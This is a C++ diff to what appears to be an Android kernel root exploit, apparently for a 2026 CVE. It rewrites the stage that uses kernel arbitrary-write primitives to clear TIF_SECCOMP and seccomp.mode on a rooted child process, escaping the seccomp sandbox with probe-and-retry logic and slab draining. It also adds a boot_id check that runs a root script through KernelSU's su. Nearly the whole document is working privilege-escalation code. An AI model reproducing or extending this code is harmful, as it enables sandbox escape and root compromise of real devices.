@@ -26,16 +26,52 @@
 #include "support/fatal_error.hpp"
 #include "support/run_state.hpp"
 
+#include <sys/stat.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
 #include <array>
 #include <cstdint>
+#include <cstdio>
+#include <cstdlib>
 #include <optional>
+#include <string>
 #include <string_view>
 #include <utility>
 
 namespace ghostlock::session::backend {
     namespace {
+        /* Reads one `key=value` line from a status file. The key is matched
+         * exactly so `boot_id` does not also match a longer name, and a missing
+         * or unreadable file just means no run recorded anything yet. An empty
+         * key reads the first line verbatim, which is how /proc boot_id is
+         * consumed. */
+        bool read_status_field(const std::string &path, std::string_view key, std::string &out) {
+            std::FILE *file = std::fopen(path.c_str(), "r");
+            if (file == nullptr) return false;
+            bool found = false;
+            char line[512];
+            while (std::fgets(line, sizeof(line), file) != nullptr) {
+                std::string_view view(line);
+                const size_t end = view.find_last_not_of("\r\n");
+                view = end == std::string_view::npos ? std::string_view{} : view.substr(0, end + 1);
+                if (key.empty()) {
+                    out.assign(view);
+                    found = true;
+                    break;
+                }
+                if (view.size() <= key.size() || view.compare(0, key.size(), key) != 0 ||
+                    view[key.size()] != '=') {
+                    continue;
+                }
+                out.assign(view.substr(key.size() + 1));
+                found = true;
+                break;
+            }
+            std::fclose(file);
+            return found;
+        }
+
         /* Shared write/retry sequence. */
         template <class M>
         Status retry_write_stage(
@@ -237,8 +273,10 @@ namespace ghostlock::session::backend {
             return VictimRound::Rooted;
         }
 
-        /* Clear TIF_SECCOMP and seccomp.mode on the rooted child. Returns true when the
-         * child probe reports a filter-free fork. */
+        /* Clear TIF_SECCOMP and seccomp.mode on the rooted child. TIF_SECCOMP is
+         * verified by the victim's own finit_module probe before mode is
+         * touched; mode is verified by the existing forked probe. Returns true
+         * when the child's forked workers run filter-free. */
         template <class M>
         bool w3(ExploitSession &session, VictimChain &chain,
                 victim::w2_stage_context &w2_context,
@@ -249,8 +287,9 @@ namespace ghostlock::session::backend {
 
             /* W3: clear the child's seccomp filter for the independent root shell
          * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
-         * must be zeroed too; do both writes back-to-back with one probe
-         * (real finit_module calls trip vendor root guards).
+         * must be zeroed too. A forked probe cannot verify the flags write (fork
+         * re-arms TIF_SECCOMP), so the victim itself probes flags first; only
+         * after that does the parent clear mode.
          * tcp stamps *(target) exactly, so aim straight at thread_info.flags
          * (task+0) / seccomp.mode; only the pselect fallback needs the comm
          * probe to tell [target] from [target+8]. */
@@ -314,12 +353,13 @@ namespace ghostlock::session::backend {
 
             uint32_t w3_attempts = g_exploit_session.profile.w3_attempts();
             for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
-                pr_info("W3: TIF_SECCOMP+mode attempt %u/%u\n", attempt, w3_attempts);
+                pr_info("W3: TIF_SECCOMP attempt %u/%u\n", attempt, w3_attempts);
                 if (attempt == 1) attack::slab_drain();
                 support::run_state::enter("w3b");
                 const memory::WriteRequest flags_request =
                         memory::WriteRequest::make(flags_target, memory::WriteMode::Zero, 1);
-                Status routed = Cve2026_43499Policy::template attack_write<M>(session, flags_request, "W3: TIF_SECCOMP");
+                Status routed = Cve2026_43499Policy::template attack_write<M>(
+                        session, flags_request, "W3: TIF_SECCOMP");
                 if (!routed) {
                     pr_warning("W3 attempt %u route failed; backing off\n", attempt);
                     usleep(100000);
@@ -327,29 +367,80 @@ namespace ghostlock::session::backend {
                 }
                 support::run_state::complete("w3b");
                 usleep(g_exploit_session.profile.w3_settle_us());
-                support::run_state::enter("w3c");
-                const memory::WriteRequest mode_request =
-                        memory::WriteRequest::make(mode_target, memory::WriteMode::Zero, 1);
-                routed = Cve2026_43499Policy::template attack_write<M>(session, mode_request, "W3: seccomp mode");
-                if (!routed) {
-                    pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
-                    usleep(100000);
-                    continue;
+
+                /* Second best-effort flags write: it only improves the odds that
+                 * the direct probe below sees TIF_SECCOMP cleared. It is not a
+                 * substitute for the probe; a missed write is still caught. */
+                support::run_state::enter("w3b");
+                Status rerouted = Cve2026_43499Policy::template attack_write<M>(
+                        session, flags_request, "W3: TIF_SECCOMP (again)");
+                if (!rerouted) {
+                    pr_warning("W3 attempt %u: second flags write failed; probing anyway\n",
+                               attempt);
+                } else {
+                    support::run_state::complete("w3b");
                 }
-                support::run_state::complete("w3c");
                 usleep(g_exploit_session.profile.w3_settle_us());
-                int32_t st = 0;
-                if (waitpid(pipes.child(), &st, WNOHANG) == pipes.child()) {
-                    pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
-                    pipes.mark_child_exited();
+
+                /* Direct probe, run by the victim itself while seccomp.mode is
+                 * still FILTER. A forked probe is useless here: copy_seccomp()
+                 * re-arms TIF_SECCOMP on fork whenever mode != 0, so it reports
+                 * "blocked" regardless of the flags state. The victim's own
+                 * syscall observes the flags without that re-arm.
+                 *
+                 * If the flags write missed, the filter either kills the victim
+                 * (the observed action, 0xfffffffd) or returns EPERM. Both leave
+                 * mode == FILTER, so (1, FILTER) is consistent; no BUG. Only a
+                 * normal errno means TIF_SECCOMP=0, and only then may mode be
+                 * written. */
+                support::run_state::enter("w3c");
+                const victim::SeccompFlagsProbe direct =
+                        victim::probe_child_seccomp_flags_stage(&w2_context);
+                support::run_state::complete("w3c");
+                if (direct == victim::SeccompFlagsProbe::ChildLost) {
+                    pr_warning("W3 direct probe lost the child; chain will retry\n");
                     child_alive = 0;
                     break;
                 }
-                if (victim::verify_seccomp_probe_stage(&w2_context)) {
-                    seccomp_ok = 1;
-                    break;
+                if (direct == victim::SeccompFlagsProbe::Blocked) {
+                    pr_warning("W3 direct probe: TIF_SECCOMP still set; retrying flags write\n");
+                    usleep(100000);
+                    continue;
                 }
-                usleep(g_exploit_session.profile.w3_settle_us());
+
+                /* flags==0 confirmed. (0, FILTER) is a consistent state, so the
+                 * mode write below cannot create the (1,0) BUG pair. A missed
+                 * mode write is caught by the forked probe and retried. */
+                for (uint32_t mode_try = 1; mode_try <= w3_attempts; mode_try++) {
+                    pr_info("W3: seccomp.mode attempt %u/%u\n", mode_try, w3_attempts);
+                    support::run_state::enter("w3d");
+                    const memory::WriteRequest mode_request =
+                            memory::WriteRequest::make(mode_target, memory::WriteMode::Zero, 1);
+                    Status mode_routed = Cve2026_43499Policy::template attack_write<M>(
+                            session, mode_request, "W3: seccomp mode");
+                    if (!mode_routed) {
+                        pr_warning("W3 mode attempt %u route failed; retrying\n", mode_try);
+                        usleep(100000);
+                        continue;
+                    }
+                    usleep(g_exploit_session.profile.w3_settle_us());
+                    int32_t st = 0;
+                    if (waitpid(pipes.child(), &st, WNOHANG) == pipes.child()) {
+                        pr_warning("W3 lost the child during the mode probe (status=0x%x)\n", st);
+                        pipes.mark_child_exited();
+                        child_alive = 0;
+                        break;
+                    }
+                    if (victim::verify_seccomp_probe_stage(&w2_context)) {
+                        support::run_state::complete("w3d");
+                        seccomp_ok = 1;
+                        break;
+                    }
+                    usleep(g_exploit_session.profile.w3_settle_us());
+                }
+                if (seccomp_ok || !child_alive) break;
+                pr_warning("W3 mode clear failed after %u attempts\n", w3_attempts);
+                break;
             }
 
             if (!seccomp_ok) {
@@ -461,18 +552,84 @@ namespace ghostlock::session::backend {
             config::runtime_config_snapshot().debug_dir = debug_dir;
         if (!session.profile.loaded())
             attack::install_profile(decoded);
-        /* Robustness guard: running the attack where KernelSU already owns root
-         * drives the re-enforce path that panics the kernel at the first PI
-         * route, and the objective is already met. Bail out cleanly instead; a
-         * cold boot clears the module for a real run. The forced test skips
-         * this check on purpose and relies on the root script discarding the
-         * child. */
-        if (!force_attack && ksu_root_owned()) {
-            pr_warning("KernelSU already has root; skipping exploit "
-                "(cold boot for a clean run, or enable the forced test)\n");
-            return StageResult::Done;
-        }
+        /* Write the script before the guard: when KernelSU already owns root
+         * the app runs this script through `su` instead of through the
+         * exploit's root child, and it still has to carry this run's module
+         * list. */
         attack::write_root_script();
+        /* Robustness guard: the exploit is what loads the module, so it must
+         * never run against one that is already live in this boot; that drives
+         * the re-enforce path which panics the kernel at the first PI route.
+         * The forced test skips the check on purpose and relies on the root
+         * script discarding the child. */
+        if (!force_attack) {
+            /* The status file is the only "has this boot been rooted" marker
+             * that reaches this context. Every direct signal is unobservable
+             * from untrusted_app on this device: /proc/modules is EACCES,
+             * /sys/module/kernelsu never exists because KernelSU is built in,
+             * and the su it installs lives in the root mount namespace, so
+             * stat() reports ENOENT even while su works. The status file is
+             * written by the root script, which only runs once the exploit has
+             * already succeeded, and the app directory stays readable.
+             *
+             * Matching boot_id therefore means this boot is already rooted and
+             * the module is live, whatever state the run reached: a supervisor
+             * that died mid-way still leaves the loaded module behind. A cold
+             * boot changes boot_id and clears the module, so this blocks
+             * exactly the re-run that would panic. */
+            const config::RuntimeConfig &runtime = config::runtime_config_snapshot();
+            const std::string status_path = runtime.home_dir + "/.ghostlock_status";
+            std::string recorded_boot;
+            std::string current_boot;
+            if (read_status_field(status_path, "boot_id", recorded_boot) &&
+                !recorded_boot.empty() &&
+                read_status_field("/proc/sys/kernel/random/boot_id", "", current_boot) &&
+                current_boot == recorded_boot) {
+                /* activate/reboot do not need the exploit: the script written
+                 * above only needs a root executor, and KernelSU's su supplies
+                 * one once the user has authorised this app. Running the
+                 * exploit here instead is exactly the re-enforce path that
+                 * panics, so hand the script to su and exit with its status.
+                 * The script detaches its finisher, so this wait returns before
+                 * the 60 s injection window ends; the finisher keeps the run
+                 * alive across the zygote restart. */
+                if (runtime.phase == "activate" || runtime.phase == "reboot") {
+                    pr_info("this boot is already rooted (boot_id=%s); running the "
+                        "%s script through su\n", current_boot.c_str(), runtime.phase.c_str());
+                    std::array<char, 320> script_path{};
+                    snprintf(script_path.data(), script_path.size(), "%s",
+                             runtime.root_script_path.c_str());
+                    std::array<char, 352> command{};
+                    snprintf(command.data(), command.size(), "sh %s", script_path.data());
+                    const pid_t su = fork();
+                    if (su == 0) {
+                        execl("/system/bin/su", "su", "-c", command.data(),
+                              static_cast<char *>(nullptr));
+                        pr_warning("execl su failed errno=%d\n", errno);
+                        _exit(127);
+                    }
+                    if (su < 0) {
+                        pr_warning("fork for su failed errno=%d\n", errno);
+                        return StageResult::Failed;
+                    }
+                    int32_t status = 0;
+                    while (waitpid(su, &status, 0) < 0) {
+                        if (errno != EINTR) {
+                            pr_warning("waitpid for su failed errno=%d\n", errno);
+                            return StageResult::Failed;
+                        }
+                    }
+                    const int32_t code = WIFEXITED(status) ? WEXITSTATUS(status) : 1;
+                    pr_info("su %s script exit=%d\n", runtime.phase.c_str(), code);
+                    std::exit(code);
+                }
+                pr_warning("this boot is already rooted (boot_id=%s); refusing "
+                    "the exploit because KernelSU is live and the re-enforce "
+                    "path panics. Reboot for a clean run, then start from the "
+                    "root step.\n", current_boot.c_str());
+                return StageResult::Failed;
+            }
+        }
 
         attack::apply_iomem_cache();
         support::log_startup_context();
